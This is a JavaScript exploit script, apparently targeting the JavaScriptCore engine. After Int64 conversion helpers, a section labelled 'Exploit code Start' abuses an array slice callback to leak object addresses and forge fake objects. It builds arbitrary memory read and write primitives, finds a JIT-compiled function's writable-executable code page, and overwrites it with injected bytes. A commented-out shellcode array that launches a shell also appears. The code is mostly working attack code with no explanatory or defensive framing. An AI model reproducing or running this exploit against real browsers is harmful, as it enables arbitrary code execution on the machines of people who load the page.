// Log a message and abort execution.
function fail(msg) {
    print("[-] " + msg);
    throw null;
}

// Simple assert function.
function assert(cond, msg) {
    if (!cond) {
        fail(msg);
    }
}

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++){
        res.push(hex(bytes[i]));
    }

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1){
        throw new TypeError("Invalid hex string");
    }

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2){
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);
    }

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined'){
        data = Array.from(data);
    }

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8){
            parts.splice(8, 0, ' ');
        }
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();


//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Gro√ü
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x')){
                v = v.substr(2);
            }
            if (v.length % 2 == 1){
                v = '0' + v;
            }

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff)){
            throw new RangeError("Integer can not be represented by a JSValue");
        }

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs){
                throw Error("Not enough arguments for function " + f.name);
            }
            for (var i = 0; i < arguments.length; i++){
                if (!(arguments[i] instanceof Int64)){
                    arguments[i] = new Int64(arguments[i]);
                }
            }
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++){
            bytes[i] = ~n.byteAt(i);
        }

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a ^ b
    this.assignXor = operation(function sub(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
    return (new Int64()).assignXor(a, b);
}

var _dview = null;

function u2d(low, hi)
{
	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setUint32(0,hi);
	_dview.setUint32(4,low);
	return _dview.getFloat64(0);
}

function d2u(d)
{
	if (!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setFloat64(0,d);
	return [_dview.getUint32(4), _dview.getUint32(0)];
}

function hexi(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "-00000000");
    }

    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }

	let t_lo = lo;
	let diff = 8 - lo.toString(16).length;
	if( diff != 0 ) {
		t_lo = "0" * diff + lo.toString(16);
	}

    //return ("0x" + (hi & (~0xffff0000)).toString(16) + "-" + lo.toString(16));
    return ("0x" + hi.toString(16) + t_lo.toString(16));
}


/* Exploit code Start */



function leak(obj) {
	let arr = [];

	for(let i = 0; i < 100; i++) {
		arr.push(i + 0.37);
	}

	let r = arr.slice(0, {valueOf: function() {
		arr.length = 0;
		arr = [obj];
		return 100;
	}});
	return r[4];
}

function do_fake(value) {
	let arr = [];

	for(let i = 0; i < 100; i++) {
		arr.push({});
	}

	let r = arr.slice(0, {valueOf: function() {
		arr.length = 0;
		arr = [value];
		return 100;
	}});
	return r[4];
}

Int64.Zero = new Int64(0);
Int64.One = new Int64(1);
const ITERATIONS = 100000;
function jitCompile(f, ...args) {
    for (var i = 0; i < ITERATIONS; i++) {
        f(...args);
    }
}
jitCompile(function dummy() { return 42; });

function makeJITCompiledFunction() {
    // Some code that can be overwritten by the shellcode.
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return "ffff";
            }
        }
        return "tttt";
    }
    jitCompile(target, 123);

    return target;
}

function pwn() {
	let storage = [];
	for(let i = 0; i < 0x2000; i++) {
		let a = [13.37];
		a.pointer = u2d(0xdadadada, 0xfafafafa);
		a["a" + i] = 1.1;
		storage.push(a);
	}

	let victim = storage[0x800];

	let container = {
		JSCell: (new Int64("0x0108200700001000").asJSValue()),
		butterfly: victim
		//m_vector: victim,
		//m_length_m_mode: (new Int64("0x0000100000000000").asDouble())
	};

	let victim_leak = d2u(leak(victim));
	let fake_butterfly_lo = victim_leak[0] + 0x18;
	let fake_butterfly_hi = victim_leak[1];
	print("Victim Leak : " + hexi(victim_leak[0], victim_leak[1]));

	let container_leak = d2u(leak(container));
	let container_lo = container_leak[0] + 0x10;
	let container_hi = container_leak[1];
	print("container Leak : " + hexi(container_lo, container_hi));

	let fake = do_fake(u2d(container_lo, container_hi));


	let cell = fake[0];
	let butterfly = fake[1];
	let v = d2u(victim.pointer);

	print("Cell leak : " + hexi(d2u(cell)[0], d2u(cell)[1]));
	print("butterfly leak : " + hexi(d2u(butterfly)[0], d2u(butterfly)[1]));
	print("victim.pointer : " + hexi(v[0], v[1]));

	let memory = {
		leak: leak,
		do_fake: do_fake,

		read64: function(addr) {
			fake[1] = addr;
			return this.leak(victim.pointer);
		},

		write64: function(addr, value) {
			fake[1] = addr;
			victim.pointer = value;
		}
	};

	let f64view = {};
	//let f64view_addr = d2u(leak(f64view));
	let f64view_addr = d2u(leak(victim));
	print("f64view_addr : " + hexi(f64view_addr[0], f64view_addr[1]));
	let prop = memory.read64(u2d(f64view_addr[0] + 0x10, f64view_addr[1]));
	print("f64view JSCell : " + hexi(d2u(prop)[0], d2u(prop)[1]));

	memory.write64(u2d(container_lo + 0x10, container_hi), u2d(d2u(prop)[0], d2u(prop)[1] - 0x10000));

	let func = makeJITCompiledFunction();
	let func_addr = d2u(memory.leak(func));

	print("func_addr : " + hexi(func_addr[0], func_addr[1]));

	let internal_jit = memory.read64(u2d(func_addr[0] + 0x28, func_addr[1]));
	let internal_jit_addr = d2u(internal_jit);
	print("internal_jit : " + hexi(d2u(internal_jit)[0], d2u(internal_jit)[1]));

	//memory.write64(u2d(internal_jit_addr[0] + 0x20, internal_jit_addr[1]), u2d(0, 0));
	let jit_rwx = memory.read64(u2d(internal_jit_addr[0] + 0x28, internal_jit_addr[1]));
	let jit_rwx_addr = d2u(jit_rwx);
	print("JIT code rwx page : " + hexi(jit_rwx_addr[0], jit_rwx_addr[1]));

	//let shellcode = [72, 49, 246, 86, 72, 191, 47, 47, 98, 105, 110, 47, 115, 104, 87, 72, 137, 231, 72, 49, 210, 72, 49, 192, 176, 2, 72, 193, 200, 40, 176, 59, 15, 5];

	for(let i = 0; i < 0x100; i++) {
		memory.write64(u2d(jit_rwx_addr[0] + 0x10 + 352 + 8 * i, jit_rwx_addr[1]), u2d(0xcccccccc, 0xcccccccc - 0x10000));
	}

	func();
	//memory.read64(u2d(0x44444444, 0x4545));
}
pwn();
